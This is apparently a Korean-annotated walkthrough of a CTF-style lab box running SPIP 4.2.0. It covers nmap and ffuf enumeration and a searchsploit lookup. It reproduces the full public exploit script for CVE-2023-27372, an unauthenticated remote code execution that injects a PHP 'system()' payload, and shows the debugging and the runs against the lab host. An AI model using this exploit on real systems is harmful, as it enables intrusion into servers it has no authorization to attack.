# 10.201.9.123

nmap -Pn -sV -sC -oN nmap.txt --open 10.201.9.123

┌──(root㉿docker-desktop)-[/]
└─# nmap -Pn -sV -sC -oN nmap.txt --open 10.201.9.123
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-21 15:03 UTC
Nmap scan report for 10.201.9.123
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 7c:7e:2e:2c:f7:c0:c2:65:04:f4:3f:f4:f8:42:af:07 (RSA)
| 256 4b:6e:8e:ff:63:f4:bc:6b:8a:ec:65:97:0f:33:55:40 (ECDSA)
|\_ 256 a7:a3:b7:2f:64:4e:c9:38:10:44:69:58:e1:e8:85:aa (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-title: Publisher's Pulse: SPIP Insights & Tips
|\_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

ffuf -u http://10.201.9.123 -H "Host:FUZZ.10.201.9.123" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178 -t 50 -mc 200,302

┌──(root㉿docker-desktop)-[/]
└─# ffuf -u http://10.201.9.123 -H "Host:FUZZ.10.201.9.123" -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.201.9.123
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
:: Header : Host: FUZZ.10.201.9.123
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 178

---

22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
| 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|\_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-server-header: Apache/2.4.41 (Ubuntu)
|\_http-title: Publisher's Pulse: SPIP Insights & Tips
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

![](https://velog.velcdn.com/images/agnusdei1207/post/c9aee363-a145-4492-a058-9d1eabd973c6/image.png)

ffuf -u "http://10.201.9.123/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -fs 0 -fc 404
┌──(root㉿docker-desktop)-[/]
└─# ffuf -u "http://10.201.9.123/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.201.9.123/FUZZ
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

images [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 334ms]
server-status [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 419ms]
spip [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 330ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

![](https://velog.velcdn.com/images/agnusdei1207/post/1857c055-20e8-41ff-a8fa-0947585311cb/image.png)

images, server-status, spip

![](https://velog.velcdn.com/images/agnusdei1207/post/4b46f70a-95d5-4c12-8b5a-47b174ffecf3/image.png)

![](https://velog.velcdn.com/images/agnusdei1207/post/af9a94e6-090f-4696-9601-444fa18824f8/image.png)
http://10.201.9.123/spip/spip.php?page=login&url=spip.php%3Fpage%3Dplan&lang=fr

![](https://velog.velcdn.com/images/agnusdei1207/post/c85edd3d-63d7-4a14-8bc1-cc659a4e2aea/image.png)

- 4.2.0 unauthenticated vulnerable

https://github.com/advisories/GHSA-7w4r-xxr6-xrcj
https://github.com/PaulSec/SPIPScan?source=post_page-----a256af21d7bd---------------------------------------

> apt install exploitdb
> searchsploiot -u
> searchsploit spip

# 10.201.9.123

┌──(root㉿docker-desktop)-[/]
└─# searchsploit spip

---

Exploit Title | Path

---

SPIP - 'connect' PHP Injection (Metasploit) | php/remote/27941.rb
SPIP 1.8.2 - 'Spip_RSS.php' Remote Command Execution | php/webapps/27172.txt
SPIP 1.8.2g - Remote Command Execution | php/webapps/1482.php
SPIP 1.8.3 - 'Spip_login.php' Remote File Inclusion | php/webapps/27589.txt
SPIP 1.8/1.9 - 'index.php3' Cross-Site Scripting | php/webapps/27158.txt
SPIP 1.8/1.9 - Multiple SQL Injections | php/webapps/27157.txt
SPIP 2.1 - 'var_login' Cross-Site Scripting | php/webapps/34388.txt
SPIP 2.x - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/37397.html
SPIP 3.1.1/3.1.2 - File Enumeration / Path Traversal | php/webapps/40596.txt
SPIP 3.1.2 - Cross-Site Request Forgery | php/webapps/40597.txt
SPIP 3.1.2 Template Compiler/Composer - PHP Code Execution | php/webapps/40595.txt
SPIP < 2.0.9 - Arbitrary Copy All Passwords to '.XML' File | php/webapps/9448.py
SPIP CMS < 2.0.23/ 2.1.22/3.0.9 - Privilege Escalation | php/webapps/33425.py
spip v4.1.10 - Spoofing Admin account | php/webapps/51557.txt
SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py

---

# 4.2.0 RCE 취약점 발견

Shellcodes: No Results
Papers: No Results

![](https://velog.velcdn.com/images/agnusdei1207/post/35cf51f8-0267-4bba-8e49-4c8986663cfa/image.png)

SPIP v4.2.0 - Remote Code Execution (Unauthenticated) | php/webapps/51536.py

> cat /usr/share/exploitdb/exploits/php/webapps/51536.py

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# 해당 내용 코드

# Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated)
# Google Dork: inurl:"/spip.php?page=login"
# Date: 19/06/2023
# Exploit Author: nuts7 (https://github.com/nuts7/CVE-2023-27372)
# Vendor Homepage: https://www.spip.net/
# Software Link: https://files.spip.net/spip/archives/
# Version: < 4.2.1 (Except few fixed versions indicated in the description)
# Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0
# CVE reference : CVE-2023-27372 (coiffeur)
# CVSS : 9.8 (Critical)
#
# Vulnerability Description:
#
# SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.
# This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.
#
# Usage: python3 CVE-2023-27372.py http://example.com
import argparse # 명령줄 인자(command-line arguments)를 파싱하기 위해 argparse 모듈을 가져옴.
import bs4 # BeautifulSoup 4 (bs4) 모듈을 가져옴. HTML/XML 문서에서 데이터를 추출(스크래핑)하는 데 사용됨.
import html # HTML 엔티티를 처리하기 위해 html 모듈을 가져옴 (주로 인코딩/디코딩).
import requests # HTTP 요청을 보내기 위해 requests 라이브러리를 가져옴.

def parseArgs():
    # 명령줄 인자를 파싱하는 함수 정의.
    parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7")
    # 스크립트 설명을 설정.
    parser.add_argument("-u", "--url", default=None, required=True, help="SPIP application base URL")
    # 필수 인자: SPIP 애플리케이션의 기본 URL (Uniform Resource Locator)을 정의.
    parser.add_argument("-c", "--command", default=None, required=True, help="Command to execute")
    # 필수 인자: 서버에서 실행할 명령어를 정의.
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
    # 선택적 인자: 상세 모드(verbose mode) 활성화 여부를 정의.
    return parser.parse_args() # 파싱된 인자들을 반환.

def get_anticsrf(url):
    # Cross-Site Request Forgery (CSRF) 방지 토큰(Anti-CSRF token)을 가져오는 함수 정의.
    # SPIP의 비밀번호 재설정 페이지('/spip.php?page=spip_pass')에 요청을 보냄.
    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)
    # 응답 텍스트를 파싱하기 위해 BeautifulSoup 객체를 생성.
    soup = bs4.BeautifulSoup(r.text, 'html.parser')
    # HTML에서 이름이 'formulaire_action_args'인 <input> 태그를 찾음. 이 태그에 Anti-CSRF 토큰이 포함되어 있음.
    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf_input:
        # 태그를 찾았다면, 해당 태그의 'value' 속성에서 토큰 값을 추출.
        csrf_value = csrf_input['value']
        if options.verbose:
            # 상세 모드일 경우 토큰 값을 출력.
            print("[+] Anti-CSRF token found : %s" % csrf_value)
        return csrf_value # 토큰 값을 반환.
    else:
        # 토큰을 찾지 못했을 경우 오류 메시지를 출력하고 -1을 반환.
        print("[-] Unable to find Anti-CSRF token")
        return -1

def send_payload(url, payload):
    # 공격 페이로드(payload)를 전송하는 함수 정의.
    data = {
        "page": "spip_pass", # POST 요청의 'page' 인자는 'spip_pass' (비밀번호 재설정 페이지).
        "formulaire_action": "oubli", # 'formulaire_action' 인자는 'oubli' (잊어버림) 액션을 트리거.
        "formulaire_action_args": csrf, # 앞에서 얻은 Anti-CSRF 토큰 값을 사용.
        "oubli": payload # 'oubli' 파라미터에 RCE를 위한 악성 페이로드를 전달.
    }
    # 공격 페이로드를 담은 POST 요청을 해당 URL로 전송.
    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)
    if options.verbose:
        # 상세 모드일 경우 전송된 페이로드를 출력.
        print("[+] Execute this payload : %s" % payload)
    return 0 # 함수 종료.

if __name__ == '__main__':
    # 스크립트가 직접 실행될 때 실행되는 메인 블록.
    options = parseArgs() # 명령줄 인자를 파싱하여 'options' 변수에 저장.

    # HTTPS 요청 시 발생하는 SSL/TLS 경고를 비활성화하는 설정.
    requests.packages.urllib3.disable_warnings()
    # SSL/TLS 암호화 스위트(cipher suite)를 조작하여 특정 환경에서 발생할 수 있는 연결 문제를 회피.
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    try:
        # pyOpenSSL을 사용하는 환경에서도 동일한 암호화 스위트 설정을 시도 (일관성 유지).
        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    except AttributeError:
        pass # pyOpenSSL 관련 속성이 없을 경우 무시.

    # get_anticsrf 함수를 호출하여 Anti-CSRF 토큰을 얻음.
    csrf = get_anticsrf(url=options.url)

    # 최종 페이로드를 생성하고 send_payload 함수를 호출하여 전송.
    # 페이로드 구조: s:길이:"PHP 코드";
    # s:20+len(options.command):"<?php system('사용자 입력 명령어'); ?>";
    # 이는 PHP의 직렬화(serialization) 포맷이며, 'oubli' 파라미터가 역직렬화될 때
    # 악의적인 객체나 코드를 주입하여 원격 코드 실행을 유발하는 Insecure Deserialization 공격 기법을 사용.
    # 'system()' 함수는 인자로 전달된 운영체제(Operating System, OS) 명령어를 실행.
    send_payload(url=options.url, payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len(options.command), options.command))
```

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.9.123 -c "id"
python3: can't open file '/usr/share/exploitdb/exploits/php/webapps/51536': [Errno 2] No such file or directory

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.9.123 -c "id"
Traceback (most recent call last):
File "/usr/share/exploitdb/exploits/php/webapps/51536.py", line 63, in <module>
requests.packages.urllib3.util.ssl*.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: module 'urllib3.util.ssl*' has no attribute 'DEFAULT_CIPHERS'

# 문제있는 코드 주석

──(root㉿docker-desktop)-[/]
└─# vim /usr/share/exploitdb/exploits/php/webapps/51536.py

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.9.123 -c "id"
File "/usr/share/exploitdb/exploits/php/webapps/51536.py", line 66
except AttributeError:
^^^^^^
IndentationError: expected an indented block after 'try' statement on line 64

# 왜 못 찾지?

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.9.123 -c "id"
[-] Unable to find Anti-CSRF token

┌──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.9.123 -c "id" --verbose
[-] Unable to find Anti-CSRF token
[+] Execute this payload : s:22:"<?php system('id'); ?>";

# 직접 input 확인하자 -> 대상에 input 태그가 없네? -> 다른 페이지 찾기 -> 취약점 다시 보기 -> spip.php?page=login

──(root㉿docker-desktop)-[/]
└─# http http://10.201.9.123

# 탐색 -> 안 나옴

┌──(root㉿docker-desktop)-[/]
└─# http http://10.201.9.123/spip.php
HTTP/1.1 404 Not Found
Connection: Keep-Alive
Content-Length: 274
Content-Type: text/html; charset=iso-8859-1
Date: Sat, 08 Nov 2025 09:41:21 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.41 (Ubuntu)

# 초반 ffuf -> /spip 로 가면? -> 결과가 안 보이므로 실패로 판단 -> 로그인 폼 찾기?

![](https://velog.velcdn.com/images/agnusdei1207/post/a9d0fb96-6adf-4e4e-91bb-cf0ea2ae1ad0/image.png)

──(root㉿docker-desktop)-[/]
└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.9.123/spip -c "id" --verbose
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
[+] Execute this payload : s:22:"<?php system('id'); ?>";
